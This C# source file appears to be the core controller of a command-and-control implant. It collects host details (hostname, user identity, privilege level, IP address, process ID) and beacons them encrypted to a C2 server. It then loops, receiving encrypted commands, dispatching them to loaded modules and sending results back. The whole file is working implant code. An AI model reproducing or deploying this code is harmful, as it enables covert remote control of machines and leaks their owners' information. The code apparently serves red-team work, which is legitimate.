using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

using Shared.Models;
using Shared.Utilities;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Agent.Controllers
{
    public class AgentController
    {
        ModuleStatus Status;

        string AgentID;
        byte[] SessionKey;
        ICommModule CommModule;
        ConfigController Config;

        List<ModuleInfo> AgentModules = new List<ModuleInfo>();

        public delegate void AgentCommand(string AgentID, C2Data C2Data);

        public AgentController(string AgentID, byte[] SessionKey, ICommModule CommModule, ConfigController Config)
        {
            Status = ModuleStatus.Starting;

            this.AgentID = AgentID;
            this.SessionKey = SessionKey;
            this.CommModule = CommModule;
            this.Config = Config;
        }

        public void RegisterAgentModule(IAgentModule Module)
        {
            Module.Init(this, Config);
            AgentModules.Add(Module.GetModuleInfo());
        }

        public void Start()
        {
            Status = ModuleStatus.Running;

            SendInitialMetadata();

            while (Status == ModuleStatus.Running)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    HandleC2Data(Message);
                }
            }
        }

        void HandleC2Data(AgentMessage Message)
        {
            var c2Data = Shared.Utilities.Utilities.DecryptData<C2Data>(SessionKey, Message.Data, Message.IV);

            var callback = AgentModules.FirstOrDefault(m => m.Name.Equals(c2Data.Module, StringComparison.OrdinalIgnoreCase)).Commands
                .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
                .Delegate;

            callback?.Invoke(Message.AgentID, c2Data);
        }

        void SendInitialMetadata()
        {
            var metadata = new AgentMetadata
            {
                AgentID = AgentID,
                Arch = Helpers.GetArch,
                Elevation = Helpers.GetIntegrity,
                Hostname = Helpers.GetHostname,
                Identity = Helpers.GetIdentity,
                IPAddress = Helpers.GetIPAddress,
                PID = Helpers.GetProcessID,
                Process = Helpers.GetProcessName,
            };

            var c2Data = new C2Data
            {
                Module = "Core",
                Command = "InitialCheckin",
                Data = Shared.Utilities.Utilities.SerialiseData(metadata)
            };

            SendMessage(c2Data);
        }

        public void SendMessage(C2Data C2Data)
        {
            var data = Shared.Utilities.Utilities.EncryptData(C2Data, SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void SendMessage(string Module, string Command, string Data)
        {
            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
            {
                Module = Module,
                Command = Command,
                Data = Encoding.UTF8.GetBytes(Data)
            },
            SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void SendMessage(string Module, string Command, byte[] Data)
        {
            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
            {
                Module = Module,
                Command = Command,
                Data = Data
            },
            SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void SendMessage(string Data)
        {
            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
            {
                Module = "Core",
                Command = "AgentOutput",
                Data = Encoding.UTF8.GetBytes(Data)
            },
            SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void SendError(string Error)
        {
            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
            {
                Module = "Core",
                Command = "AgentError",
                Data = Encoding.UTF8.GetBytes(Error)
            },
            SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        public void Stop()
        {
            Status = ModuleStatus.Stopped;
        }
    }
}